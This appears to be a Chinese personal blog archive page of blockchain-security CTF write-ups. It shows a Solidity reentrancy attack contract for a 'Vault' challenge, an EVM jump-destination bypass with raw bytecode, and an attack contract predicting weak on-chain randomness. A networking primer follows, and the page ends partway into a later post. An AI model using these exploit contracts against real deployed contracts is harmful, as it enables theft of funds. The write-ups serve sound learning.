<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://oo90909.github.io/page/11/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="fathergun">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://oo90909.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-区块链安全/其他/Vault" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/" class="article-date">
  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/">Vault</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>真的不容易。。。<br>尝试了好几种方法都以失败告终<br>###尝试一：<br>单纯的重入漏洞，就上课讲的那个，这种攻击需要满足：<br>balanceOf[…]可以溢出（0.8以下版本或者unchecked），或者withdraw方法无法回滚，否则会因为交易失败而回滚，但是题中均不满足<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-1.png" alt="Alt text"><br>###尝试二：<br>想着用msg.value多次传入<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-2.png" alt="Alt text"></p>
<p>这里是因为上次考试的第三题产生的想法，其实我并没有把那道题理解透彻，所以会有这种想法</p>
<hr>
<p>###正解：<br>不一定非要把valut合约中的余额取干净，只要在余额为0的时候调用solve就可以了，之后再deposit，把钱充值回去，类似于闪电贷<br>思路图：<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/99809584D870EC2E106BE6197CE09170.jpg" alt="Alt text"></p>
<p>最后结果达成了，flag为true，但是余额却不是0<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-3.png" alt="Alt text"></p>
<p>成功！<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-4.png" alt="Alt text"></p>
<p>实现过程中出现了一些问题，导致花在实现的时间上很长，也发现了<br>用console.log这个时候比debug好用的多<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image.png" alt="Alt text"></p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">Vault va;</span><br><span class="line"></span><br><span class="line">uint8 count=0;//这里设置count是因为要严格区分第一次和第二次调用receive方法</span><br><span class="line"></span><br><span class="line">constructor()payable  &#123;&#125;</span><br><span class="line"></span><br><span class="line">function getPara(address to)public payable &#123;</span><br><span class="line">    va=Vault(to);</span><br><span class="line">  va.deposit&#123;value:msg.value&#125;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function start()public payable &#123;</span><br><span class="line">va.withdraw(100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">receive() external payable &#123; </span><br><span class="line">   if (count==0)&#123;//第一次调用receive</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">        count++;</span><br><span class="line">    va.withdraw(100);</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">   &#125;</span><br><span class="line">   if (count==1)&#123;//第二次调用reveive</span><br><span class="line">    count++;</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">    va.solve(59);</span><br><span class="line">    va.deposit&#123;value:100&#125;();</span><br><span class="line">    console.log(&quot;deposit successful,va balance is&quot;,address(va).balance);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/" data-id="clxvwvx60001irkud34ecgrjm" data-title="Vault" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/jump" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/" class="article-date">
  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/">jump</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>用了结构体来存储，甚至用来充当mstore的第一个变量，看起来很懵逼，第一个变量不是offset数字吗？<br>结构体要如何充当mstore的第一个变量？</p>
<p>得到一个结论：结构体充当存储位置时，往往也是一个具体的插槽，如这里的0x80</p>
<p>执行存储之前的堆栈是这样的(storage没有值)<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image.png" alt="Alt text"><br>执行之后<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-1.png" alt="Alt text"></p>
<p>后来发现，如果把方法换成withdraw，0x80的值也是0x167<br>所以方法不一样对存储的数据没有任何不同，因此这里的差异只能体现在编译出来的opcode</p>
<p>执行完28行以后<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-2.png" alt="Alt text"></p>
<p>想了很久，仍然没有思路。。。当我不知道怎么做的时候，合约名提醒了我</p>
<hr>
<p>思路:调用debug后得知，程序停在了jump这里，jump 168，发现0x168后面没有jumpdest，所以没法执行，那么是否存在一种可能，某个jumpdest可以跳过withdrew的require？</p>
<p>356</p>
<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-3.png" alt="Alt text"><br>这里有很多jumpdest</p>
<p>寻找到了call函数，也是本篇合约里面唯一的call，说明这里就是withdrew的那部分，那么call前面的第一个jumpdest就是需要跳到的位置，<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-4.png" alt="Alt text"></p>
<p>经过计算，得到了这个数据，是130<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-6.png" alt="Alt text"></p>
<p>isSolved:true</p>
<p>本地remix跑通了，但是网页版跑不了。。。<br>网页版也不能debug，如果编译出来的opcode不一样也看不到，就这样吧，我尽力了</p>
<p>还没结束，有没有可能部署的时候多了一段代码</p>
<p>这是本地代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806364d98f6e146100515780636a1f9e1914610080575b600080fd5b34801561005d57600080fd5b5061006661008a565b604051808215151515815260200191505060405180910390f35b6100886100ab565b005b6000803073ffffffffffffffffffffffffffffffffffffffff163114905090565b6100b3610249565b6000341415151561012c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f73656e64206d6f6e65792100000000000000000000000000000000000000000081525060200191505060405180910390fd5b610167816000019067ffffffffffffffff16908167ffffffffffffffff1681525050348151018152610164816000015163ffffffff16565b50565b61016f610171565b565b6000341415156101e9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260088152602001807f6e6f206d6f6e657900000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610246573d6000803e3d6000fd5b50565b60206040519081016040528061025e81525090565bfe00a165627a7a7230582036b6db795f3d2506047a2bdd25aa341d1b7d0d30f7bf2b72966af15e963a6af90029</span><br></pre></td></tr></table></figure>

<p>这是上链的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">60806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166364d98f6e81146100505780636a1f9e1914610079575b600080fd5b34801561005c57600080fd5b50610065610083565b604080519115158252519081900360200190f35b610081610089565b005b30311590565b6100916101c4565b3415156100ff57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600b60248201527f73656e64206d6f6e657921000000000000000000000000000000000000000000604482015290519081900360640190fd5b3467ffffffffffffffff610120160180825261011d9063ffffffff16565b50565b61012861012a565b565b341561019757604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600860248201527f6e6f206d6f6e6579000000000000000000000000000000000000000000000000604482015290519081900360640190fd5b6040513390303180156108fc02916000818181858888f1935050505015801561011d573d6000803e3d6000fd5b60408051602081019091526101d7815290565bfe00a165627a7a7230582048e92681d6d38d52fd4cde04a96d8e77b5a18916af1adf6cba1088c86ded54ad0029</span><br></pre></td></tr></table></figure>


<p>攻击代码(获取部署来的runtimecode)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract GetCode &#123;</span><br><span class="line"> function getAddressCode(address _target) public view returns (bytes memory</span><br><span class="line">code) &#123;</span><br><span class="line"> uint size;</span><br><span class="line"> assembly &#123;</span><br><span class="line"> size := extcodesize(_target)</span><br><span class="line"> code := mload(0x40)</span><br><span class="line"> mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line"> mstore(code, size)</span><br><span class="line"> extcodecopy(_target, add(code, 0x20), 0, size)</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/" data-id="clxvwvx66001rrkudgqm95xsf" data-title="jump" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/randomNumber" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/randomNumber/" class="article-date">
  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/randomNumber/">jump</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>一个现象：<br>在合约中两个不同的地方调用block.timeStamp，只要是在同一笔交易中，那结果就是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BadRandomness is ERC721 &#123;</span><br><span class="line">    uint256 totalSupply;</span><br><span class="line"></span><br><span class="line">    // 构造函数，初始化NFT合集的名称、代号</span><br><span class="line">    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint</span><br><span class="line">    function luckyMint(uint256 luckyNumber) external &#123;</span><br><span class="line">        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number</span><br><span class="line">        require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;);</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, totalSupply); // mint</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function attackMint(BadRandomness nftAddr) external &#123;</span><br><span class="line">        // 提前计算随机数</span><br><span class="line">        uint256 luckyNumber = uint256(</span><br><span class="line">            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</span><br><span class="line">        ) % 100;</span><br><span class="line">        // 利用 luckyNumber 攻击</span><br><span class="line">        nftAddr.luckyMint(luckyNumber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/randomNumber/" data-id="clxvwvx66001srkud1qlthjyf" data-title="jump" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/代理模式" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/" class="article-date">
  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/">selector crash</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>不同的代理模式有:<br>cd模式：</p>
<p>透明代理：</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/" data-id="clxvwvx6a001zrkud955gdvus" data-title="selector crash" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/网络基本知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" class="article-date">
  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">selector crash</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这篇文章旨在帮助扫盲平时读文章，解决问题可能遇到的网络相关知识，内容不是很深，主要是概念扫盲汇总</p>
<p>代理：帮助用户隐藏自己的ip地址，在访问网站时使用代理提供的ip地址<br>（原理是代理替代用户进行访问，然后将访问到的内容传输给用户），但无法隐藏用户想要传送的数据，会将数据原文发送给代理端进行传输</p>
<p>vpn：同上，不同的是vpn可以加密想要传输的数据（隧道技术），用户端需要安装软件，在软件上完成加密，将密文传输给代理商，再传输给目标网站<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image.png" alt="Alt text"></p>
<p>适配器：原本不能连接的硬件（软件），有了适配器以后，就可以通过适配器来连接了，clash就是一种适配器<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image-1.png" alt="Alt text"></p>
<p>dns：domain name server，用来将域名解析成为ip地址的ip，网络上有很多的DNS网站<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image-2.png" alt="Alt text"><br>这里的首选dns服务器地址和clash的ip没有什么关系，<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image-3.png" alt="Alt text"><br>也就是说这里填的是ipv4地址</p>
<p>网址和域名的关系：<br>一般的网址格式为：&lt;协议&gt;:∥&lt;服务器类型&gt; . &lt;域名&gt;&#x2F;&lt;目录&gt;&#x2F;&lt;文件名&gt;；<br>比如：<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/444755817#:~:text=%E5%9F%9F%E5%90%8D%EF%BC%9A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E6%98%AF%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E9%97%B4%E7%9B%B8%E4%BA%92%E8%81%94%E7%BB%9C%E7%9A%84%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E3%80%82%20%E7%BD%91%E5%9D%80%EF%BC%9A%E6%9F%90%E4%B8%80%E7%BD%91%E7%AB%99%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E5%BB%BA%E7%AB%8B%E7%9A%84%E5%8F%AF%E4%BE%9B%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%9A%84%E5%9C%B0%E5%9D%80%E3%80%82,%E4%BB%8E%E5%9F%9F%E5%90%8D%E4%B8%8E%E7%BD%91%E5%9D%80%E7%9A%84%E5%90%AB%E4%B9%89%E4%B8%AD%E5%B0%B1%E8%83%BD%E5%A4%9F%E7%9C%8B%E5%87%BA%EF%BC%8C%E2%80%9C%E7%BD%91%E5%9D%80%E2%80%9D%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BD%9C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%B9%B3%E5%B8%B8%E6%89%80%E8%AF%B4%E7%9A%84%E2%80%9C%E9%93%BE%E6%8E%A5%E2%80%9D%EF%BC%9B%20%E8%80%8C%E2%80%9C%E5%9F%9F%E5%90%8D%E2%80%9D%E9%99%A4%E4%BA%86%E8%83%BD%E5%A4%9F%E4%BD%9C%E4%B8%BA%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%EF%BC%8C%E4%B9%9F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%9B%B4%E5%83%8F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E8%BA%AB%E4%BB%BD%E6%A0%87%E8%AF%86%E3%80%82">https://zhuanlan.zhihu.com/p/444755817#:~:text=%E5%9F%9F%E5%90%8D%EF%BC%9A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E6%98%AF%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E9%97%B4%E7%9B%B8%E4%BA%92%E8%81%94%E7%BB%9C%E7%9A%84%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E3%80%82%20%E7%BD%91%E5%9D%80%EF%BC%9A%E6%9F%90%E4%B8%80%E7%BD%91%E7%AB%99%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E5%BB%BA%E7%AB%8B%E7%9A%84%E5%8F%AF%E4%BE%9B%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%9A%84%E5%9C%B0%E5%9D%80%E3%80%82,%E4%BB%8E%E5%9F%9F%E5%90%8D%E4%B8%8E%E7%BD%91%E5%9D%80%E7%9A%84%E5%90%AB%E4%B9%89%E4%B8%AD%E5%B0%B1%E8%83%BD%E5%A4%9F%E7%9C%8B%E5%87%BA%EF%BC%8C%E2%80%9C%E7%BD%91%E5%9D%80%E2%80%9D%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BD%9C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%B9%B3%E5%B8%B8%E6%89%80%E8%AF%B4%E7%9A%84%E2%80%9C%E9%93%BE%E6%8E%A5%E2%80%9D%EF%BC%9B%20%E8%80%8C%E2%80%9C%E5%9F%9F%E5%90%8D%E2%80%9D%E9%99%A4%E4%BA%86%E8%83%BD%E5%A4%9F%E4%BD%9C%E4%B8%BA%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%EF%BC%8C%E4%B9%9F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%9B%B4%E5%83%8F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E8%BA%AB%E4%BB%BD%E6%A0%87%E8%AF%86%E3%80%82</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" data-id="clxvwvx6d0024rkude5148vsc" data-title="selector crash" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-区块链安全/其他/选择器碰撞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
